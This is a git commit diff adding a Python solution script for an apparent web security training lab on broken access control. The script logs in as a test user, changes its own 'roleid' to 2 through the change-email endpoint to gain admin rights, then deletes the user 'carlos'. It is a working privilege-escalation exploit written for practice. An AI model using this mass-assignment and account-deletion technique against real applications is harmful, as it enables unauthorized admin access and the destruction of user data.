b0f6d09f98456f001a1f7c9e8119e0aa1261f5f2
Robin Burri <robinburri@tutanota.com>
2023-09-27 15:34:26 +0200

    BAC lab_4 done

--- BAC/lab_4.py
+++ BAC/lab_4.py
@@ -1,11 +1,12 @@
-# Lab #4 User role can be modified in user profile 
+# Lab #4 User role can be modified in user profile
 # import re
 import sys
 
 # from typing import Optional, cast
 
-# import requests
+import requests
 import urllib3
+
 # from bs4 import BeautifulSoup
 # from bs4.element import Tag
 from colorama import Fore
@@ -17,6 +18,46 @@ urllib3.disable_warnings()
 
 proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
+
+def delete_user():
+    login_url = url + "login"
+    data_login = {"username": "wiener", "password": "peter"}
+    r = s.post(login_url, data=data_login, verify=False, proxies=proxies, timeout=5)
+    r.raise_for_status()
+    res = r.text
+    if "Log out" in res:
+        print(f"{Fore.GREEN}[+] Logged in as wiener user{Fore.RESET}")
+
+        # Change the role id of the user
+        change_email_url = url + "my-account/change-email"
+        data_role_change = {"email": "a@a.com", "roleid": 2}
+        r = s.post(
+            change_email_url,
+            json=data_role_change,
+            verify=False,
+            proxies=proxies,
+            timeout=5,
+        )
+        r.raise_for_status()
+        res = r.text
+        if "Admin" in res:
+            print(f"{Fore.GREEN}[+] Email changed to a@a.com{Fore.RESET}")
+
+            # Delete the Carlos user
+            delete_carlos_url = url + "admin/delete?username=carlos"
+            r = s.get(delete_carlos_url, verify=False, proxies=proxies, timeout=5)
+            r.raise_for_status()
+            if r.status_code == 200:
+                print(f"{Fore.GREEN}[+] Carlos deleted{Fore.RESET}")
+            else:
+                print(f"{Fore.RED}[-] Carlos not deleted{Fore.RESET}")
+                sys.exit(-1)
+        else:
+            print(f"{Fore.RED}[-] Email not changed{Fore.RESET}")
+            sys.exit(-1)
+    else:
+        print(f"{Fore.RED}[-] Couldn't log in{Fore.RESET}")
+        sys.exit(-1)
 
 
 if __name__ == "__main__":
@@ -31,4 +72,5 @@ if __name__ == "__main__":
         sys.exit(-1)
 
     print("[*] Exploiting...")
-    # exploit()
+    s = requests.Session()
+    delete_user()
